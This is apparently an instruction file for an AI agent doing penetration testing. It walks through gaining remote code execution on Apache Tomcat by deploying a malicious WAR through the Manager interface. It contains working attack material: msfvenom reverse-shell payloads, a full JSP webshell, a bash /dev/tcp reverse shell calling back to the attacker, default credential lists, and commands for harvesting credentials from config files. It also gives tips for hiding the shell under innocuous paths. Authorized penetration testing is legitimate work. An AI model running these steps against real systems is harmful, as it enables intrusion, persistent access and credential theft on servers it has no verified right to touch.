---
name: tomcat-manager-deploy
description: >
  Deploy WAR files via Apache Tomcat Manager for remote code execution.
  Use when Tomcat Manager is accessible with valid credentials (manager-script
  or manager-gui role). Covers WAR generation, deployment via text API and HTML
  interface, reverse shell delivery, and cleanup. Common initial access vector
  after credential discovery via LFI, default creds, or config file exposure.
keywords:
  - tomcat manager
  - WAR deploy
  - WAR file upload
  - tomcat RCE
  - manager-script
  - manager-gui
  - tomcat reverse shell
  - JSP shell
  - msfvenom war
  - tomcat-users.xml
  - /manager/text
  - /manager/html
  - tomcat exploitation
  - application server RCE
tools:
  - msfvenom
  - curl
  - jar
opsec: medium
---

# Tomcat Manager WAR Deployment

You are helping a penetration tester exploit authenticated access to Apache
Tomcat's Manager application to deploy a malicious WAR file and achieve remote
code execution. All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[tomcat-manager-deploy] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## Scope Boundary

This skill covers Tomcat Manager WAR deployment — authenticating to the Manager
interface, generating a malicious WAR payload, deploying it, triggering code
execution, and catching a reverse shell. When you reach the boundary of this
scope — whether through completing your methodology or discovering findings outside your domain — **STOP**.

Do not load or execute another skill. Do not continue past your scope boundary.
Instead, return to the orchestrator with:
  - What was found (vulns, credentials, access gained)
  - Context to pass (injection point, target, working payloads, etc.)

The orchestrator decides what runs next. Your job is to execute this skill
thoroughly and return clean findings.

**Stay in methodology.** Only use techniques documented in this skill. If you
encounter a scenario not covered here, note it and return — do not improvise
attacks, write custom exploit code, or apply techniques from other domains.
The orchestrator will provide specific guidance or route to a different skill.

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Exploit and Tool Transfer

Never download exploits, scripts, or tools directly to the target from the
internet (`curl https://github.com/...`, `git clone` on target). Targets may
lack outbound internet access, and operators must review files before they
reach the target.

**Attackbox-first workflow:**

1. **Download on attackbox** — `git clone`, `curl`, `searchsploit -m` locally
2. **Review** — inspect source code or binary provenance before transferring
3. **Serve** — `python3 -m http.server 8080` from the directory containing the file
4. **Pull from target** — `wget http://ATTACKBOX:8080/file -O /tmp/file` or
   `curl http://ATTACKBOX:8080/file -o /tmp/file`

**Alternatives when HTTP is not viable:** `scp`/`sftp` (if SSH exists),
`nc` file transfer, base64-encode and paste, or
`impacket-smbserver share . -smb2support` on attackbox.

**Inline source code** written via heredoc in this skill does not need this
workflow — the operator can read the code directly.

## Prerequisites

- **Tomcat Manager credentials** with `manager-script` or `manager-gui` role
  - From LFI: `/var/lib/tomcat{7,8,9,10}/conf/tomcat-users.xml`,
    `/opt/tomcat/conf/tomcat-users.xml`, `/etc/tomcat*/tomcat-users.xml`
  - From default creds: `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret`,
    `admin:tomcat`, `manager:manager`, `role1:tomcat`
  - From config exposure: misconfigured backups, GitHub leaks, `.env` files
- **Network access** to Tomcat Manager (usually port 8080 or 80/443)
- **msfvenom** installed on attackbox (for WAR generation)
- **Tomcat Manager endpoint** — `/manager/text/` (script API) or
  `/manager/html/` (web GUI)

### Manager Role Requirements

| Role | Path | Capability |
|------|------|-----------|
| `manager-gui` | `/manager/html` | Web GUI — upload WAR via browser form |
| `manager-script` | `/manager/text` | Text API — deploy/undeploy via curl |
| `manager-jmx` | `/manager/jmxproxy` | JMX monitoring only — no deployment |
| `manager-status` | `/manager/status` | Server status only — no deployment |

Only `manager-gui` and `manager-script` allow WAR deployment. If you only have
`manager-jmx` or `manager-status`, deployment is not possible via Manager —
note this in Blocked and return.

## Step 1: Assess

If not already provided by the orchestrator or conversation context, determine:

1. **Tomcat version** — check `/` or error pages for version string
2. **Manager access** — test both `/manager/text/list` and `/manager/html/`
3. **Credentials** — try provided creds or defaults
4. **Attacker IP** — determine the correct callback interface

### Verify Manager Access

```bash
# Test manager-script API (text)
curl -s -u 'USER:PASS' 'http://TARGET:8080/manager/text/list'
# Expected: "OK - Listed applications for virtual host ..."

# Test manager-gui (HTML)
curl -s -o /dev/null -w '%{http_code}' -u 'USER:PASS' 'http://TARGET:8080/manager/html'
# Expected: 200
```

### Determine Attacker IP

Use the correct network interface for reverse shell callbacks. Prefer VPN/tunnel
interfaces over NAT adapters:

```bash
# Prefer tun0 (VPN), fall back to first non-loopback IP
LHOST=$(ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[\d.]+') || \
LHOST=$(hostname -I | awk '{print $1}')
echo "Callback IP: $LHOST"
```

**Common mistakes:**
- Using NAT adapter IP (10.0.2.15, 192.168.x.x) when on VPN — target can't
  reach it
- Using Docker bridge IP (172.17.x.x)
- Verify with: `ping -c1 $LHOST` from target context if possible

### Password Special Characters

Tomcat passwords often contain shell metacharacters (`!`, `$`, `&`, etc.).
When using `curl -u`, these must be handled carefully:

```bash
# Option 1: Single-quote the -u argument (prevents shell expansion)
curl -u 'tomcat:P@$$w0rd!' ...

# Option 2: Use Authorization header directly (most reliable)
# Base64-encode user:pass
AUTH=$(echo -n 'tomcat:P@$$w0rd!' | base64)
curl -H "Authorization: Basic $AUTH" ...

# Option 3: URL-encode special chars in the URL itself
curl 'http://tomcat:P%40%24%24w0rd%21@TARGET:8080/manager/text/list'
```

**`!` in double quotes** is especially problematic — bash interprets it as
history expansion. Always use single quotes or the Authorization header method.

## Step 2: Generate WAR Payload

### msfvenom JSP Reverse Shell (Recommended)

```bash
# Standard JSP reverse shell WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f war \
  -o /tmp/claude-1000/shell.war

# Alternative: Java meterpreter (if using Metasploit handler)
msfvenom -p java/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f war \
  -o /tmp/claude-1000/shell.war

# Staged variant (smaller payload, needs Metasploit handler)
msfvenom -p java/shell/reverse_tcp LHOST=$LHOST LPORT=4444 -f war \
  -o /tmp/claude-1000/shell.war
```

### Manual JSP Webshell WAR (No msfvenom)

If msfvenom is not available, create a WAR manually:

```bash
# Create a command execution JSP
mkdir -p /tmp/claude-1000/wardir
cat > /tmp/claude-1000/wardir/cmd.jsp << 'JSPEOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) out.println(line);
    br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
    while ((line = br.readLine()) != null) out.println(line);
}
%>
JSPEOF

# Package as WAR
cd /tmp/claude-1000/wardir && jar -cvf /tmp/claude-1000/cmd.war cmd.jsp
```

### Verify WAR Contents

```bash
# List WAR contents to confirm the JSP is inside
jar -tf /tmp/claude-1000/shell.war | head -10
```

## Step 3: Deploy WAR

### Method 1: Manager Text API (manager-script role)

```bash
# Deploy via PUT (Tomcat 7+)
curl -u 'USER:PASS' --upload-file /tmp/claude-1000/shell.war \
  'http://TARGET:8080/manager/text/deploy?path=/app'
# Expected: "OK - Deployed application at context path [/app]"

# Deploy via PUT with Authorization header (for special characters in password)
AUTH=$(echo -n 'USER:PASS' | base64)
curl -H "Authorization: Basic $AUTH" --upload-file /tmp/claude-1000/shell.war \
  'http://TARGET:8080/manager/text/deploy?path=/app'

# Verify deployment
curl -u 'USER:PASS' 'http://TARGET:8080/manager/text/list'
# Should show: /app:running:0:app
```

**Deploy to a non-obvious path** to reduce visibility:

```bash
# Use an innocuous name
curl -u 'USER:PASS' --upload-file /tmp/claude-1000/shell.war \
  'http://TARGET:8080/manager/text/deploy?path=/docs'
```

### Method 2: Manager HTML Interface (manager-gui role)

When only `manager-gui` is available (no `manager-script`), deploy via the
HTML form upload. This requires a multipart POST:

```bash
# Upload WAR via HTML form
curl -u 'USER:PASS' -F "deployWar=@/tmp/claude-1000/shell.war" \
  'http://TARGET:8080/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=NONCE'
```

**CSRF token required**: The HTML interface uses CSRF protection. Extract the
nonce first:

```bash
# Get CSRF nonce from manager page
NONCE=$(curl -s -u 'USER:PASS' 'http://TARGET:8080/manager/html' | \
  grep -oP 'CSRF_NONCE=\K[A-F0-9]+' | head -1)

# Deploy with nonce
curl -u 'USER:PASS' -F "deployWar=@/tmp/claude-1000/shell.war" \
  "http://TARGET:8080/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$NONCE"
```

### Verify Deployment

```bash
# Check via text API
curl -u 'USER:PASS' 'http://TARGET:8080/manager/text/list'

# Or check directly
curl -s -o /dev/null -w '%{http_code}' 'http://TARGET:8080/app/'
# Expected: 200
```

## Step 4: Trigger and Catch Shell

### Reverse Shell (msfvenom WAR)

1. **Start listener** on attackbox (use MCP shell-server if available):

```bash
# Via MCP shell-server (preferred)
# start_listener(port=4444, label="tomcat-war-rce")

# Via netcat fallback
nc -nlvp 4444
```

2. **Trigger the JSP** — msfvenom WAR contains a randomly named JSP inside.
   Find and request it:

```bash
# List the JSP filename inside the WAR
jar -tf /tmp/claude-1000/shell.war | grep '\.jsp$'
# Output example: scprbjej.jsp

# Trigger the reverse shell
curl 'http://TARGET:8080/app/JSPNAME.jsp'
```

If you don't know the JSP filename, request the context root — Tomcat may
auto-invoke `index.jsp` or the default servlet:

```bash
curl 'http://TARGET:8080/app/'
```

3. **Verify shell connection** — check the listener for incoming connection.

### Command Execution (Manual WAR)

For the manual `cmd.jsp` webshell:

```bash
# Execute commands
curl 'http://TARGET:8080/app/cmd.jsp?cmd=id'
curl 'http://TARGET:8080/app/cmd.jsp?cmd=whoami'

# Send reverse shell from webshell
curl --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'" \
  'http://TARGET:8080/app/cmd.jsp'
```

### Stabilize Shell

After catching the reverse shell:

```bash
# Via MCP shell-server
# stabilize_shell(session_id="...")

# Manual stabilization
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:
stty raw -echo; fg
export TERM=xterm
```

### Verify Access

```bash
id
whoami
hostname
cat /etc/os-release
```

Common Tomcat service users: `tomcat`, `tomcat8`, `tomcat9`, `www-data`

## Step 5: Cleanup

Undeploy the WAR when done to reduce footprint:

```bash
# Via text API
curl -u 'USER:PASS' 'http://TARGET:8080/manager/text/undeploy?path=/app'
# Expected: "OK - Undeployed application at context path [/app]"

# Verify removal
curl -u 'USER:PASS' 'http://TARGET:8080/manager/text/list'
```

**Clean up local files:**

```bash
rm -f /tmp/claude-1000/shell.war /tmp/claude-1000/cmd.war
rm -rf /tmp/claude-1000/wardir
```

## Step 6: Escalate or Pivot

After catching a shell as the Tomcat service user:

- **Linux target**: STOP. Return to orchestrator recommending
  **linux-discovery**. Pass: hostname, current user (tomcat/tomcatN), shell
  session ID, access method (reverse shell via WAR deploy).
- **Windows target**: STOP. Return to orchestrator recommending
  **windows-discovery**. Pass: hostname, current user, shell session ID,
  access method.
- **Tomcat running as root/SYSTEM** (rare but happens): You already have
  maximum privileges. Collect evidence and report.
- **Other web apps on same Tomcat**: Check for additional applications with
  credentials or data. Read `conf/server.xml` for database connection strings.

Report in your return summary: any new credentials, access, vulns, or pivot
paths discovered.

When routing, pass along: target hostname/IP, current user, shell session ID,
Tomcat version, and any credentials found on the system.

### Post-Exploitation Quick Wins

Before routing to discovery, grab these from the Tomcat service user context:

```bash
# Tomcat config files (credentials, DB connections)
cat /var/lib/tomcat*/conf/tomcat-users.xml 2>/dev/null
cat /opt/tomcat/conf/tomcat-users.xml 2>/dev/null
cat /var/lib/tomcat*/conf/context.xml 2>/dev/null
cat /var/lib/tomcat*/conf/server.xml 2>/dev/null

# Web app configs (may contain DB creds, API keys)
find /var/lib/tomcat*/webapps -name "*.xml" -o -name "*.properties" | head -20
grep -r "password" /var/lib/tomcat*/webapps/*/WEB-INF/ 2>/dev/null | head -10

# Environment variables
env | sort
```

## Tomcat Version Differences

| Version | Manager Text Path | Default Port | Notes |
|---------|------------------|-------------|-------|
| Tomcat 7 | `/manager/text/` | 8080 | Legacy; `manager-script` role |
| Tomcat 8 | `/manager/text/` | 8080 | `manager-script` role |
| Tomcat 9 | `/manager/text/` | 8080 | `manager-script` role |
| Tomcat 10+ | `/manager/text/` | 8080 | Jakarta namespace; same API |

All versions use the same text API. WAR files are compatible across versions
(Java servlet spec is backward-compatible).

**Tomcat 7 legacy note**: Older Tomcat 7 installs may use `/manager/deploy`
instead of `/manager/text/deploy`.

## OPSEC Notes

- WAR deployment creates files on disk in `webapps/` — visible to defenders
- Manager access is logged in Tomcat access logs
- Reverse shells generate network connections visible to NIDS
- Undeploy the WAR after testing to reduce footprint
- `manager-script` API calls appear in access logs with basic auth
- Consider using an innocuous context path (`/docs`, `/examples`) to blend in

## Troubleshooting

### 401 Unauthorized on Manager

- Credentials are wrong or user lacks required role
- Check if `manager-script` or `manager-gui` role is assigned in `tomcat-users.xml`
- Try default credentials: `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret`
- Some installs require the user to be in **both** a `manager-*` role and the
  `admin-gui` role

### 403 Forbidden on /manager/html

- User has `manager-script` but not `manager-gui` — use the text API instead
- Tomcat's `META-INF/context.xml` in the manager app may restrict access by IP:
  ```xml
  <Valve className="org.apache.catalina.valves.RemoteAddrValve"
         allow="127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1" />
  ```
  If IP-restricted, the text API may also be blocked unless accessed from
  localhost. Try via AJP proxy (route to **ajp-ghostcat**) or SSRF.

### Deploy Returns "FAIL - Deploy Upload Failed"

- WAR file may be too large — check `maxPostSize` in `server.xml`
- Disk space may be full in `webapps/` directory
- Tomcat may not have write permission to `webapps/`
- Try a smaller payload: manual JSP WAR is typically <2KB vs msfvenom ~20KB

### Shell Doesn't Connect Back

- **Wrong LHOST**: Verify attacker IP is reachable from target
  (`ip -4 addr show tun0`)
- **Firewall**: Target may block outbound connections — try different ports
  (80, 443, 53 often allowed)
- **NAT**: Don't use NAT adapter IP (10.0.2.x) when on VPN
- **Payload encoding**: Ensure the JSP filename is correct when triggering
- **Try bind shell**: If outbound is blocked, use `msfvenom -p java/jsp_shell_bind_tcp`
  and connect to the target instead

### WAR Deploys but JSP Returns 404

- The context path may differ from what you specified — check with
  `manager/text/list`
- The JSP name inside the WAR is random (msfvenom) — list contents with
  `jar -tf shell.war | grep .jsp`
- Try the context root: `curl http://TARGET:8080/app/` may auto-invoke the JSP

### msfvenom Not Available

Use the manual JSP webshell from Step 2. Package it as a WAR with `jar`:
```bash
jar -cvf shell.war cmd.jsp
```
Then deploy, trigger, and send a reverse shell from the webshell.
